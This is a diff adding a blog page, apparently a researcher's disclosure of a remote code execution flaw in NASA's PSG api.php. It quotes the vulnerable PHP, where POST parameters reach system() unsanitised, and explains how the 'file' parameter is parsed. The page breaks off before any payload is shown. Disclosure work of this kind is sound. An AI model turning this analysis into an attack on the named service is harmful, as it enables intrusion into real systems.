@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>NASA, Remote Code Excution (0-Day Exploit) :: My New Hugo Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="The article is about 0-day, RCE vulnerability in NASA web service. we could analyze the code of service through the docker file &gt; https://hub.docker.com/r/nasapsg/psg." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://example.org/posts/2022-02-19-rce-in-nasa/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://example.org/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://example.org/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="https://example.org/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="NASA, Remote Code Excution (0-Day Exploit)">
+<meta property="og:description" content="The article is about 0-day, RCE vulnerability in NASA web service. we could analyze the code of service through the docker file &gt; https://hub.docker.com/r/nasapsg/psg." />
+<meta property="og:url" content="https://example.org/posts/2022-02-19-rce-in-nasa/" />
+<meta property="og:site_name" content="My New Hugo Site" />
+
+  
+    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2022-02-19 12:32:45 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://example.org/">
+  <div class="logo">
+    re-Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://example.org/posts/2022-02-19-rce-in-nasa/">NASA, Remote Code Excution (0-Day Exploit)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2022-02-19</time>
+    
+</div>
+
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <h3 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The psg.gsfc.nasa.gov was very vulnerable to Remote Code Execution.</p>
+<hr>
+<h3 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>docker pull nasapsg/psg
+</span></span><span style="display:flex;"><span>docker run -it -p 3000:3000 nasapsg/psg /bin/sh
+</span></span></code></pre></div><p>If you set as above, you can analyze the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>https://psg.gsfc.nasa.gov/api.php
+</span></span></code></pre></div><p>The Remote Code Execution vulnerability occurred in the above URL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Define parameters of the run
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$wgeo<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>;$wephm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>;$watm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>;$whdr<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>;$wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;wgeo&#39;</span>]))  $wgeo <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;wgeo&#39;</span>];  <span style="color:#66d9ef">else</span> $wgeo <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;y&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;wephm&#39;</span>])) $wephm<span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;wephm&#39;</span>]; <span style="color:#66d9ef">else</span> $wephm<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;n&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;watm&#39;</span>]))  $watm <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;watm&#39;</span>];  <span style="color:#66d9ef">else</span> $watm <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;n&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;whdr&#39;</span>]))  $whdr <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;whdr&#39;</span>];  <span style="color:#66d9ef">else</span> $whdr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;y&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;type&#39;</span>]))  $otyp <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;type&#39;</span>];  <span style="color:#66d9ef">else</span> $otyp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rad&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;mode&#39;</span>]))  $mode <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;mode&#39;</span>];  <span style="color:#66d9ef">else</span> $mode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;set&#39;</span> <span style="color:#f92672">||</span> $otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;upd&#39;</span>) <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;cfg&#39;</span> <span style="color:#f92672">||</span> $otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;ret&#39;</span>) {                      $wcon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wgas<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;str&#39;</span> <span style="color:#f92672">||</span> $otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;srf&#39;</span>) {$wgeo<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $watm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wcon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>; $wgas<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;tel&#39;</span>) {                $wgeo<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $watm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wcon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wgas<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;trn&#39;</span> <span style="color:#f92672">||</span> $otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;atm&#39;</span>) {                                            $wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;opc&#39;</span>) {                $wgeo<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $watm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wcon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>; $wgas<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>; $wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;n&#39;</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($otyp<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;mss&#39;</span>) {                                                            $wgen<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;y&#39;</span>;}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// /var/www/html/api.php
+</span></span></span></code></pre></div><p>When I see the above code, get a value of parameter called wgeo, wephm, watm, whdr, type, mode and I can see that put in each variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($app)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Call the app
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  $app <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^a-z]/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">htmlspecialchars</span>(<span style="color:#a6e22e">substr</span>($app,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>),<span style="color:#a6e22e">ENT_QUOTES</span>,<span style="color:#e6db74">&#39;UTF-8&#39;</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>($bindir <span style="color:#f92672">.</span> $app <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">.</span> $ID);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Call the modules
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ($wgeo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> $wephm<span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;n&#39;</span>) <span style="color:#a6e22e">system</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;geometry &#39;</span> <span style="color:#f92672">.</span> $ID <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; ephm=&#39;</span> <span style="color:#f92672">.</span> $wephm <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; atm=&#39;</span> <span style="color:#f92672">.</span> $watm);   <span style="color:#75715e">// Call the geometry module
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ($watm<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;y&#39;</span>) <span style="color:#a6e22e">system</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;atmosphere &#39;</span> <span style="color:#f92672">.</span> $ID);   <span style="color:#75715e">// Call the atmosphere model  if ($otyp==&#39;ret&#39;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">exec</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;retrieve &#39;</span>  <span style="color:#f92672">.</span> $ID);                    <span style="color:#75715e">// Call the retrieval module  } else if ($geo==&#39;massspec&#39; &amp;&amp; $wgen==&#39;y&#39;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      $otyp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mss&#39;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exec</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;mass &#39;</span>  <span style="color:#f92672">.</span> $ID);                      <span style="color:#75715e">// Call the Mass-Spec module  } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($wcon<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;y&#39;</span>) <span style="color:#a6e22e">exec</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;continuum &#39;</span> <span style="color:#f92672">.</span> $ID);    <span style="color:#75715e">// Call the surfaces and transmittance module
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($wgas<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $ast<span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;none&#39;</span>) {                      <span style="color:#75715e">// Call the atmospheric modules
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ($ast<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;coma&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;cem &#39;</span> <span style="color:#f92672">.</span> $ID);                      <span style="color:#75715e">// Call the cometary emission model
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      } <span style="color:#66d9ef">else</span>  {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;pumas &#39;</span> <span style="color:#f92672">.</span> $ID);                    <span style="color:#75715e">// Call the planetary radiative transfer module
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($wgen<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;y&#39;</span>) <span style="color:#a6e22e">exec</span>($bindir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;generator &#39;</span> <span style="color:#f92672">.</span> $ID);    <span style="color:#75715e">// Call the flux integrator
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// /var/www/html/api.php
+</span></span></span></code></pre></div><p>When I see code below, I can see the above code! In the here, When I see to use a system() function in first “if statement” of “else statement”.</p>
+<p>In the here, The important information is values of $wephm and $watm variables are passed as the “argument” values of the system() function. This means that a Remote Code Execution attack can be performed by manipulating the variable.</p>
+<p>But, I can’t see the result value of system() function because it execute on the server.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$tfile <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;file&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">substr</span>($tfile,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;&lt;&#39;</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>$maxlines<span style="color:#f92672">=</span><span style="color:#ae81ff">2000</span>; $lines[$maxlines]; $iline<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>$indata<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; $ndat<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; $maxvals<span style="color:#f92672">=</span><span style="color:#ae81ff">50000</span>; $lams[$maxvals]; $vals[$maxvals]; $evals[$maxvals]; $noise<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>$b1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($tfile,<span style="color:#e6db74">&#39;&lt;BINARY&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($b1<span style="color:#f92672">!==</span><span style="color:#66d9ef">FALSE</span>) {
+</span></span><span style="display:flex;"><span>  $b2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($tfile,<span style="color:#e6db74">&#39;&lt;/BINARY&gt;&#39;</span>); <span style="color:#66d9ef">if</span> ($b2<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">0</span>) $b2<span style="color:#f92672">=</span><span style="color:#a6e22e">strlen</span>($tfile);
+</span></span><span style="display:flex;"><span>  $bindata <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($tfile, $b1<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>, $b2<span style="color:#f92672">-</span>$b1<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ($bindata<span style="color:#f92672">!==</span><span style="color:#66d9ef">False</span>) {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($resdir <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;binaries/&#39;</span> <span style="color:#f92672">.</span> $ID <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">.</span> $binname <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.dat&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($file, $bindata);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  $tfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($tfile,<span style="color:#ae81ff">0</span>,$b1) <span style="color:#f92672">.</span> <span style="color:#a6e22e">substr</span>($tfile,$b2<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($add) $tfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($resdir <span style="color:#f92672">.</span> $ID <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_cfg.txt&#39;</span>) <span style="color:#f92672">.</span> $tfile;
+</span></span><span style="display:flex;"><span>$txts <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#a6e22e">PHP_EOL</span>, $tfile);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">count</span>($txts)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>) $txts <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, $tfile);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">count</span>($txts) <span style="color:#f92672">&amp;&amp;</span> $iline<span style="color:#f92672">&lt;</span>$maxlines <span style="color:#f92672">&amp;&amp;</span> $ndat<span style="color:#f92672">&lt;</span>$maxvals;$i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>  $txt <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">trim</span>($txts[$i]),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">30000</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;ATMOSPHERE-STRUCTURE&gt;&#39;</span>, <span style="color:#ae81ff">22</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) $ast  <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">substr</span>($txt,<span style="color:#ae81ff">22</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;GENERATOR-GAS-MODEL&gt;&#39;</span>,  <span style="color:#ae81ff">21</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) $wgas <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">substr</span>($txt,<span style="color:#ae81ff">21</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;GENERATOR-CONT-MODEL&gt;&#39;</span>, <span style="color:#ae81ff">22</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) $wcon <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">substr</span>($txt,<span style="color:#ae81ff">22</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;GEOMETRY&gt;&#39;</span>, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)             $geo  <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">substr</span>($txt,<span style="color:#ae81ff">10</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;DATA&gt;&#39;</span>, <span style="color:#ae81ff">6</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) { $indata<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>; <span style="color:#66d9ef">continue</span>; }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;/DATA&gt;&#39;</span>,<span style="color:#ae81ff">7</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) { $indata<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">continue</span>; }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ($indata) {
+</span></span><span style="display:flex;"><span>    $nv <span style="color:#f92672">=</span> <span style="color:#a6e22e">sscanf</span>($txt,<span style="color:#e6db74">&#39;%e %e %e&#39;</span>, $lam, $flux, $noise); <span style="color:#66d9ef">if</span> ($nv<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    $lams[$ndat]<span style="color:#f92672">=</span>$lam;
+</span></span><span style="display:flex;"><span>    $vals[$ndat]<span style="color:#f92672">=</span>$flux;
+</span></span><span style="display:flex;"><span>    $evals[$ndat]<span style="color:#f92672">=</span>$noise;
+</span></span><span style="display:flex;"><span>    $ndat<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>($txt,<span style="color:#e6db74">&#39;&lt;&#39;</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    $pky <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($txt,<span style="color:#e6db74">&#39;&gt;&#39;</span>); <span style="color:#66d9ef">if</span> ($pky<span style="color:#f92672">===</span><span style="color:#66d9ef">false</span>) <span style="color:#66d9ef">continue</span>; <span style="color:#66d9ef">if</span> ($pky<span style="color:#f92672">&gt;=</span><span style="color:#a6e22e">strlen</span>($txt)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    $ky  <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($txt,<span style="color:#ae81ff">1</span>,$pky<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    $val <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($txt,$pky<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#a6e22e">strlen</span>($txt)<span style="color:#f92672">-</span>$pky<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    $lines[$iline]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;&#39;</span> <span style="color:#f92672">.</span> $ky <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">.</span> $val <span style="color:#f92672">.</span> <span style="color:#a6e22e">PHP_EOL</span>;
+</span></span><span style="display:flex;"><span>    $iline<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($iline<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($resdir <span style="color:#f92672">.</span> $ID <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_cfg.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span>$iline;$i<span style="color:#f92672">++</span>) <span style="color:#a6e22e">fwrite</span>($file, $lines[$i]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($ndat<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>  $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($resdir <span style="color:#f92672">.</span> $ID <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_dat.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ($nv<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span>$ndat;$i<span style="color:#f92672">++</span>) <span style="color:#a6e22e">fprintf</span>($file,<span style="color:#e6db74">&#34;%e %e %e</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, $lams[$i], $vals[$i], $evals[$i]); <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span>$ndat;$i<span style="color:#f92672">++</span>) <span style="color:#a6e22e">fprintf</span>($file,<span style="color:#e6db74">&#34;%e %e</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, $lams[$i], $vals[$i]);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Additionally, before we exploit the above vulnerability, we should know one. If we send a request using the POST method, Server get the value of the file parameter and parse it into a file.</p>
+<p>So, at first I passed the data containing random value to the file parameter, but it doesn’t seem to work. It seemed like I had to put the data the parser needed. So I decided to look for a sample file on the NASA site.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>&lt;OBJECT&gt;Exoplanet
